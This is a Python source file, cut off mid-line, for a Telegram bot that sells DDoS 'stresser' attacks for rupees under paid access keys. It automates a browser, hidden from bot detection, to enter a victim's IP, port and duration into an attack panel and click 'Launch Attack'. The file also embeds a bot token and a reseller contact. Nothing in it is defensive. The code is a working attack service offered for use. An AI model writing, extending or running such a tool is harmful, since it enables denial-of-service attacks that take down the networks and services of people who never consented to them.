# stresser_bot.py
import asyncio
import logging
import sqlite3
import time
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────
TOKEN = "8793284729:AAHHZ3HDQuXa8zOhde9GuJ8swcrWJcm4UWA"
ADMIN_IDS = [123456789, 84342238157]
DB_FILE = "bot_data.db"
PANEL_URL = "https://return.st/panel"

# Selectors
IP_SELECTOR = 'input[placeholder="70.70.70.70"]'
PORT_SELECTOR = 'input[type="number"][placeholder="80"]'
TIME_SELECTOR = 'input[type="number"][min="1"][max="60"]'
LAUNCH_BUTTON_SELECTOR = 'button.inline-flex.items-center.justify-center, button:contains("Launch Attack")'

DEFAULT_TIME = 60
MAX_TIME = 60

# ────────────────────────────────────────────────
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ──────── Database ────────
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, registered_at TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, days INTEGER, created_at TEXT, used_by INTEGER DEFAULT NULL, used_at TEXT)''')
        conn.commit()

init_db()

# ──────── Helpers ────────
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def generate_key(days: int) -> str:
    key = f"eren-{int(time.time())}-{days}d"
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("INSERT INTO keys (key, days, created_at) VALUES (?, ?, ?)",
                  (key, days, datetime.now().isoformat()))
        conn.commit()
    return key

def redeem_key(key: str, user_id: int) -> tuple[bool, str]:
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("SELECT days, used_by FROM keys WHERE key = ?", (key,))
        row = c.fetchone()
        if not row:
            return False, "Invalid key."
        days, used_by = row
        if used_by is not None:
            return False, "Key already used."
        c.execute("UPDATE keys SET used_by = ?, used_at = ? WHERE key = ?",
                  (user_id, datetime.now().isoformat(), key))
        conn.commit()
    return True, f"✅ Key redeemed! Valid for {days} days."

# ──────── Selenium ────────
driver = None
wait = None

def init_browser():
    global driver, wait
    try:
        options = uc.ChromeOptions()
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1280,900")
        
        driver = uc.Chrome(options=options, version_main=133)  # Change version if needed
        wait = WebDriverWait(driver, 25)
        
        logger.info(f"🌐 Opening panel: {PANEL_URL}")
        driver.get(PANEL_URL)
        
        logger.info("✅ Chrome launched and panel opened successfully!")
        logger.info("Waiting 8 seconds for full page load...")
        time.sleep(8)
       
    except Exception as e:
        logger.error(f"Browser init failed: {e}")
        raise

# ──────── Attack Function ────────
async def send_attack(ip: str, port: str, seconds: int):
    global driver
    if driver is None:
        init_browser()
    
    try:
        # IP
        el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, IP_SELECTOR)))
        el.clear()
        el.send_keys(ip)
        
        # Port
        el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, PORT_SELECTOR)))
        el.clear()
        el.send_keys(port)
        
        # Time
        el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, TIME_SELECTOR)))
        el.clear()
        el.send_keys(str(seconds))
        
        # Launch Button
        btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, LAUNCH_BUTTON_SELECTOR)))
        btn.click()
        
        return True, f"✅ **Attack Started**\nTarget: `{ip}:{port}`\nDuration: {seconds}s"
    
    except Exception as e:
        return False, f"❌ Error launching attack: {str(e)}"

# ──────── Commands ────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    username = update.effective_user.username or "User"
   
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id, username, registered_at) VALUES (?,?,?)",
                  (uid, username, datetime.now().isoformat()))
        conn.commit()
    
    welcome_text = (
        "👋 **Welcome to Eren Stresser Bot!** 🚀\n\n"
        "🔥 **Fast 3 Node Stresser**\n"
        "🌍 **Nodes:** Singapore | Bangalore | Canada\n\n"
        "**Commands:**\n"
        "`/eren <ip> <port> [time]` - Launch Attack (Max 60s)\n"
        "`/panel` - View Nodes\n"
        "`/price` - Show Pricing\n"
        "`/redeem <key>` - Activate Key\n"
        "`/help` - Show Help"
    )
    await update.message.reply_text(welcome_text, parse_mode="Markdown")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def eren(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: `/eren <ip> <port> [seconds]`", parse_mode="Markdown")
        return
    
    ip = args[0].strip()
    port = args[1].strip()
    try:
        seconds = int(args[2]) if len(args) >= 3 else DEFAULT_TIME
    except ValueError:
        seconds = DEFAULT_TIME
    
    if seconds > MAX_TIME:
        seconds = MAX_TIME
    if seconds < 10:
        await update.message.reply_text("❌ Minimum time is 10 seconds.")
        return
    
    msg = await update.message.reply_text("🔄 **Preparing Attack...**", parse_mode="Markdown")
    
    success, result = await send_attack(ip, port, seconds)
    
    if success:
        await msg.edit_text(result, parse_mode="Markdown")
        await asyncio.sleep(seconds + 5)
        await update.message.reply_text(f"🏁 **Attack Finished**\n`{ip}:{port}` ({seconds}s)", parse_mode="Markdown")
    else:
        await msg.edit_text(result, parse_mode="Markdown")

async def price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    price_text = (
        "💰 **Pricing**\n\n"
        "• 1 Day → 50₹\n"
        "• 7 Days → 300₹\n"
        "• Resellers DM @LFX_EREN"
    )
    await update.message.reply_text(price_text, parse_mode="Markdown")

async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_photo(photo=open('1.jpg', 'rb'), caption="🌏 **Node 1 - Singapore**", parse_mode="Markdown")
        await update.message.reply_photo(photo=open('2.jpg', 'rb'), caption="🇮🇳 **Node 2 - Bangalore**", parse_mode="Markdown")
        await update.message.reply_photo(photo=open('3.jpg', 'rb'), caption="🇨🇦 **Node 3 - Canada**", parse_mode="Markdown")
    except FileNotFoundError:
        await update.message.reply_text("❌ Images not found. Put 1.jpg, 2.jpg, 3.jpg in bot folder.")

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Only admins can generate keys.")
        return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: `/genkey <days>`", parse_mode="Markdown")
        return
    days = int(context.args[0])
    key = generate_key(days)
    await update.message.reply_text(f"✅ **New Key Generated**\n`{key}`", parse_mode="Markdown")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: `/redeem <key>`", parse_mode="Markdown")
        return
    key = context.args[0].strip()
    ok, msg = redeem_key(key, update.effective_user.id)
    await update.message.reply
